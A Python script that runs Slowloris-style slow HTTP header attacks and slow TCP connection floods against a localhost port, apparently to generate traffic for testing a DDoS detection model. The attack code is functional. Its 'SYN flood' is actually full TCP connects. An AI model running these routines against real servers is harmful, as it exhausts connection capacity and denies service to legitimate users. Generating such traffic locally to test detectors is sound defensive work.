# attack_simulator.py

import socket
import threading
import time
import random
import argparse


class SlowRateDDoSSimulator:
    """
    Simulates slow-rate DDoS attacks that match your training data:
    - Long flow durations (millions of microseconds)
    - LOW packet rates (< 10 packets/second)
    - LARGE inter-arrival times between packets
    """
    
    def __init__(self, target_ip="127.0.0.1", target_port=8050):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.threads = []
        self.stats = {
            "connections": 0,
            "packets_sent": 0,
            "start_time": None
        }
        self.lock = threading.Lock()

    def slowloris_attack(self, duration=120, num_connections=20):
        """
        Slowloris-style attack: Keep connections open, send data VERY slowly
        This matches your training data pattern!
        
        Pattern from your data:
        - Flow Duration: 3-7 MILLION microseconds (3-7 seconds)
        - Packets/second: 0.67 - 8.99 (VERY LOW!)
        - Large gaps between packets
        """
        print(f"\n🐌 Starting SLOW-RATE DDoS Attack (Slowloris-style)")
        print(f"   Target: {self.target_ip}:{self.target_port}")
        print(f"   Duration: {duration}s")
        print(f"   Concurrent connections: {num_connections}")
        print(f"   Pattern: LONG flows, LOW packet rate, LARGE gaps\n")
        print(f"   This matches your training data characteristics!\n")
        
        self.running = True
        self.stats["start_time"] = time.time()
        
        def slow_connection_worker(worker_id):
            """
            Each worker maintains ONE long-lived connection
            Sends packets VERY SLOWLY with large gaps
            """
            connection_start = time.time()
            local_packets = 0
            sock = None
            
            try:
                # Create connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10.0)
                sock.bind(('127.0.0.1', 0))  # Random source port
                
                try:
                    # Initial connection (SYN packet)
                    sock.connect((self.target_ip, self.target_port))
                    
                    with self.lock:
                        self.stats["connections"] += 1
                        self.stats["packets_sent"] += 3  # SYN, SYN/ACK, ACK
                    
                    local_packets += 3
                    
                    print(f"   Worker {worker_id}: Connection established from port {sock.getsockname()[1]}")
                    
                    # Send initial HTTP header slowly
                    header = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n"
                    sock.send(header.encode())
                    local_packets += 1
                    
                    with self.lock:
                        self.stats["packets_sent"] += 1
                    
                    # Keep connection alive by sending headers VERY slowly
                    # This creates the pattern: LOW packets/second, LARGE IAT
                    while self.running and (time.time() - self.stats["start_time"]) < duration:
                        # Wait 0.5-2 seconds between packets (LARGE inter-arrival time!)
                        # This gives us 0.5-2 packets/second = matches training data!
                        delay = random.uniform(0.5, 2.0)
                        time.sleep(delay)
                        
                        if not self.running:
                            break
                        
                        # Send a partial header to keep connection alive
                        header_part = f"X-Custom-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n"
                        
                        try:
                            sock.send(header_part.encode())
                            local_packets += 1
                            
                            with self.lock:
                                self.stats["packets_sent"] += 1
                            
                            # Show progress
                            elapsed = time.time() - connection_start
                            pps = local_packets / elapsed if elapsed > 0 else 0
                            
                            if local_packets % 5 == 0:
                                flow_duration_us = elapsed * 1_000_000
                                print(f"   Worker {worker_id}: {local_packets} packets, "
                                      f"Duration: {flow_duration_us:,.0f}μs, "
                                      f"Rate: {pps:.2f} pkt/s")
                        
                        except (BrokenPipeError, ConnectionResetError):
                            print(f"   Worker {worker_id}: Connection closed by server")
                            break
                
                except (socket.timeout, ConnectionRefusedError, OSError) as e:
                    print(f"   Worker {worker_id}: Connection failed: {e}")
            
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                
                connection_duration = time.time() - connection_start
                flow_duration_us = connection_duration * 1_000_000
                pps = local_packets / connection_duration if connection_duration > 0 else 0
                
                print(f"\n   ✓ Worker {worker_id} completed:")
                print(f"     Total packets: {local_packets}")
                print(f"     Flow duration: {flow_duration_us:,.0f} microseconds")
                print(f"     Packets/second: {pps:.2f}")
                print(f"     This matches DDoS training patterns!\n")
        
        # Spawn worker threads
        print(f"✓ Starting {num_connections} slow connection workers...\n")
        
        for i in range(num_connections):
            t = threading.Thread(target=lambda: slow_connection_worker(i), daemon=True)
            t.start()
            self.threads.append(t)
            time.sleep(0.1)  # Stagger connection starts
        
        # Monitor
        self._live_stats(duration)

    def slow_syn_flood(self, duration=60, connections_per_minute=30):
        """
        Alternative: Send SYN packets slowly (not a full Slowloris)
        Creates multiple short flows with low packet rates
        """
        print(f"\n🐌 Starting SLOW SYN Flood")
        print(f"   Target: {self.target_ip}:{self.target_port}")
        print(f"   Duration: {duration}s")
        print(f"   Rate: ~{connections_per_minute} connections/minute (SLOW!)\n")
        
        self.running = True
        self.stats["start_time"] = time.time()
        
        def worker():
            while self.running and (time.time() - self.stats["start_time"]) < duration:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.bind(('127.0.0.1', 0))
                    
                    try:
                        sock.connect((self.target_ip, self.target_port))
                        
                        with self.lock:
                            self.stats["connections"] += 1
                            self.stats["packets_sent"] += 3  # SYN, SYN/ACK, ACK
                        
                        # Keep connection open for a bit
                        time.sleep(random.uniform(1.0, 3.0))
                    
                    except (socket.timeout, ConnectionRefusedError, OSError):
                        with self.lock:
                            self.stats["packets_sent"] += 1  # SYN packet sent
                
                except Exception:
                    pass
                finally:
                    if sock:
                        try:
                            sock.close()
                        except:
                            pass
                
                # SLOW rate: wait 1-3 seconds between connection attempts
                time.sleep(60.0 / connections_per_minute + random.uniform(-0.5, 0.5))
        
        # Use fewer threads for slow attack
        num_threads = 5
        print(f"✓ Starting {num_threads} worker threads\n")
        
        for _ in range(num_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
        
        self._live_stats(duration)

    def _live_stats(self, duration):
        start_time = self.stats["start_time"]
        
        try:
            while self.running and (time.time() - start_time) < duration:
                elapsed = time.time() - start_time
                remaining = duration - elapsed
                
                with self.lock:
                    total_packets = self.stats["packets_sent"]
                    rate = total_packets / elapsed if elapsed > 0 else 0
                
                print(f"\r📊 Time: {elapsed:.0f}s / {duration}s | "
                      f"Packets: {total_packets} | "
                      f"Rate: {rate:.2f} pkt/s | "
                      f"Remaining: {remaining:.0f}s", 
                      end="", flush=True)
                
                time.sleep(1.0)
        
        except KeyboardInterrupt:
            print("\n\n⏹️  Stopped manually")
        
        self.stop()
        
        elapsed = time.time() - start_time
        
        print(f"\n\n{'='*70}")
        print(f"✓ Attack simulation completed!")
        print(f"  Duration: {elapsed:.1f}s ({elapsed * 1_000_000:,.0f} microseconds)")
        print(f"  Total connections: {self.stats['connections']}")
        print(f"  Total packets: {self.stats['packets_sent']}")
        print(f"  Average rate: {self.stats['packets_sent'] / elapsed:.2f} packets/second")
        print(f"\n  Pattern characteristics:")
        print(f"  - Long flow durations ✓")
        print(f"  - Low packet rate ✓")
        print(f"  - Large inter-arrival times ✓")
        print(f"\n  This should trigger DDoS detection!")
        print(f"{'='*70}\n")

    def stop(self):
        self.running = False
        for t in self.threads:
            t.join(timeout=2)
        self.threads = []


def main():
    parser = argparse.ArgumentParser(
        description="Slow-Rate DDoS Simulator (Matches Training Data)")
    parser.add_argument(
        "--type", "-t",
        choices=["slowloris", "slow-syn"],
        default="slowloris",
        help="Attack type"
    )
    parser.add_argument(
        "--duration", "-d",
        type=int,
        default=120,
        help="Duration in seconds (recommended: 60-300 for slow attacks)"
    )
    parser.add_argument(
        "--connections", "-c",
        type=int,
        default=20,
        help="Number of concurrent connections (for slowloris)"
    )
    parser.add_argument(
        "--rate", "-r",
        type=int,
        default=30,
        help="Connections per minute (for slow-syn)"
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=8050,
        help="Target port"
    )
    
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("SLOW-RATE DDoS SIMULATOR")
    print("="*70)
    print("This simulator creates traffic patterns that match your training data:")
    print("  - Long flow durations (millions of microseconds)")
    print("  - LOW packet rates (< 10 packets/second)")
    print("  - LARGE inter-arrival times between packets")
    print("="*70)
    
    simulator = SlowRateDDoSSimulator(target_ip="127.0.0.1", target_port=args.port)
    
    if args.type == "slowloris":
        simulator.slowloris_attack(args.duration, args.connections)
    elif args.type == "slow-syn":
        simulator.slow_syn_flood(args.duration, args.rate)


if __name__ == "__main__":
    main()